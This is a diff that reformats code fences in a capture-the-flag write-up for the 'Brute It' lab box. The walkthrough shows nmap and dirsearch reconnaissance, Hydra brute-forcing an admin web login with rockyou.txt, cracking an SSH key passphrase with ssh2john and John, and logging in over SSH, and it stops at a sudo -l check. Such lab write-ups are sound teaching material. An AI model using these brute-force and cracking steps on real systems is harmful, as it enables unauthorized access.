@@ -38,7 +38,7 @@ Once we know the target machine IP, we can start a terminal an add the `target I
 
 Let's discover using `nmap` what are the open ports on the target :  
 
-```nmap -sV -sV -oA nmap/basic bruteit.thm -v
+``` nmap -sV -sV -oA nmap/basic bruteit.thm -v
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -57,7 +57,7 @@ Let's check `http://bruteit.thm` in our your browser.  Nothing of interest here.
 Are there some notable files and directories hidden from us on the HTTP server?
 Let's do a quick scan and get an answer. I like using the tool `dirsearch` for a quick initial scan :
 
-```❯ dirsearch -u bruteit.thm
+``` ❯ dirsearch -u bruteit.thm
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
@@ -124,7 +124,7 @@ Now that we have a potentially valid username,  all we need now is to find the a
 
 We'll do that by using Hydra.  It is a nice password brute forcing tool: it is fast, easy to use and well documented.  The principle behind brute forcing is simple.  The tool is going to try to login using the now known `admin` user in combination with every password that are on an existing wordlist.  In this case I use `rockyou.txt` as my pass list.
 
-```❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
+``` ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
 
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -181,7 +181,7 @@ The `id_rsa` is a Private Key file.  These files are used as credentials to conn
 
 First, let's create an **hash file** from `id_rsa`. I used a Python script named `ssh2john.py`.  When done, let's start John and wait while he does his business:
 
-```❯ ssh2john id_rsa > hash.txt
+``` ❯ ssh2john id_rsa > hash.txt
 
 ❯ john id_rsa.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -203,7 +203,7 @@ We got a match!  The **password** is : `rockinroll`
 
 We want to change file permission of id_rsa:
 
-```chmod 400 id_rsa
+``` chmod 400 id_rsa
 ls -la
 ```
 
@@ -214,7 +214,7 @@ We can see now that `id_rsa` is read-only and for a single user, me.
 
 Let use everything we have gathered so far and connect user john on SSH using the cracked password:
 
-```❯ ssh -i id_rsa john@bruteit.thm
+``` ❯ ssh -i id_rsa john@bruteit.thm
 The authenticity of host 'bruteit.thm (10.10.150.236)' can't be established.
 ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
 This key is not known by any other names.
@@ -226,7 +226,7 @@ Enter passphrase for key 'id_rsa':
 
 And...
 
-```Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+``` Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
@@ -245,13 +245,13 @@ john@bruteit:~$
 
 We are in! As john.  Check around quickly to find the `user.txt`
 
-```john@bruteit:~$ ls
+``` john@bruteit:~$ ls
 user.txt
 ```
 
 ## Now let's get root
 
-```john@bruteit:~$ sudo -l
+``` john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
